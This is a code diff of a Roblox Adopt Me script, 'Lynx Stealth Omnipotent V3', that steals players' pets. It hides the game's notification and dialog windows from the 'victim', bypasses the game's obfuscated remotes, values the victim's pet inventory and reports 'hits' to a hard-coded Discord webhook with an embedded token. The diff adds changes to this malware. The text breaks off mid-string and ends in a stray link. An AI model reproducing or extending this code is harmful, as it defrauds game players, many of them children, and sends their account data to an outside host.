@@ -1,6 +1,6 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 
--- LYNX STEALTH OMNIPOTENT V3 - DELTA STABLE
+-- LYNX STEALTH OMNIPOTENT V3 - PESO EDITION
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
 local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 local THRESHOLD = 0.13 
@@ -10,14 +10,18 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
+-- STEALTH UI: Hide notifications from victim to prevent cooldown trigger warnings
 local function applyStealth()
     pcall(function()
-        local gui = LocalPlayer:WaitForChild("PlayerGui")
-        local nApp = gui:WaitForChild("NotificationApp", 5)
-        local dApp = gui:WaitForChild("DialogApp", 5)
-        if nApp then nApp.Enabled = false end
-        if dApp then dApp.Enabled = false end
-        if gui:FindFirstChild("HintApp") then gui.HintApp:Destroy() end
+        local gui = LocalPlayer:WaitForChild("PlayerGui", 5)
+        if gui then
+            local nApp = gui:FindFirstChild("NotificationApp")
+            local dApp = gui:FindFirstChild("DialogApp")
+            local hApp = gui:FindFirstChild("HintApp")
+            if nApp then nApp.Enabled = false end
+            if dApp then dApp.Enabled = false end
+            if hApp then hApp:Destroy() end
+        end
     end)
 end
 applyStealth()
@@ -27,6 +31,7 @@ while not LocalPlayer or not LocalPlayer:FindFirstChild("PlayerGui") do
     LocalPlayer = Players.LocalPlayer 
 end
 
+-- TOBI'S HASH FINDER: Bypasses Adopt Me's obfuscated remotes
 local hashes = {}
 for _, v in pairs(getgc()) do
     if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
@@ -44,13 +49,14 @@ local function hashedAPI(remoteName, ...)
     elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
 end
 
+-- VALUATION ENGINE: Pure AMVGG Scaling (No floor limit)
 local PetBaseValues = {}
 local blacklist = {"jerboa", "starter", "minigame", "practice", "egg"}
 
 local function isTradeable(id)
-    local name = id:lower()
-    for _, word in ipairs(blacklist) do
-        if name:find(word) then return false end
+    local lid = id:lower()
+    for _, word in ipairs(blacklist) do 
+        if lid:find(word) then return false end 
     end
     return true
 end
@@ -83,13 +89,14 @@ pcall(function()
     end
 end)
 
+-- INVENTORY PROCESSING: Multiplier Grouping (x35)
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
 
 local function processInventory()
     local inv = ClientData.get("inventory")
-    local rawPets = inv.pets or {}
+    local rawPets = inv and inv.pets or {}
     local grouped = {}
     local totalWorth = 0
 
@@ -98,13 +105,14 @@ local function processInventory()
         if petData and petData.name and isTradeable(pet.id) then
             local mutations = pet.properties or {}
             local rawVal = PetBaseValues[petData.name] or 0.01
-            local finalPetVal = scaleValue(rawVal) + (mutations.mega and 3 or mutations.neon and 1 or 0)
+            local finalPetVal = scaleValue(rawVal) + (mutations.mega and 3 or mutations.neon and 1 or 0) + (mutations.rideable and 0.5 or 0) + (mutations.flyable and 0.5 or 0)
             
             if finalPetVal >= THRESHOLD then
                 totalWorth = totalWorth + finalPetVal
-                local key = petData.name .. (mutations.mega and "M" or "") .. (mutations.neon and "N" or "")
+                -- Unique key for grouping identical variants
+                local key = petData.name .. (mutations.mega and "M" or "") .. (mutations.neon and "N" or "") .. (mutations.flyable and "F" or "") .. (mutations.rideable and "R" or "")
                 if not grouped[key] then
-                    grouped[key] = {name = petData.name, val = finalPetVal, count = 1, uids = {uid}, props = mutations, rarity = petData.rarity}
+                    grouped[key] = {name = petData.name, val = finalPetVal, count = 1, uids = {uid}, props = mutations}
                 else
                     grouped[key].count = grouped[key].count + 1
                     table.insert(grouped[key].uids, uid)
@@ -119,9 +127,9 @@ local function processInventory()
 end
 
 local petList, totalValue = processInventory()
-local tier = totalValue >= 50000 and "🔴 HIGH" or totalValue >= 10000 and "🟡 MID" or "🟢 LOW"
 
-local function sendHit()
+-- WEBHOOK REPORTING
+if #petList > 0 then
     local lines = {}
     for i=1, math.min(15, #petList) do
         local p = petList[i]
@@ -135,8 +143,7 @@ local function sendHit()
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
-                content = (totalValue >= (THRESHOLD * 100)) and "@everyone" or "",
+                content = (totalValue >= 5000) and "@everyone" or "",
                 embeds = {{
-                    title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
+                    title = "Lynx Stealth Hit",
                     description = "
-http://googleusercontent.com/immersive_entry_chip/0
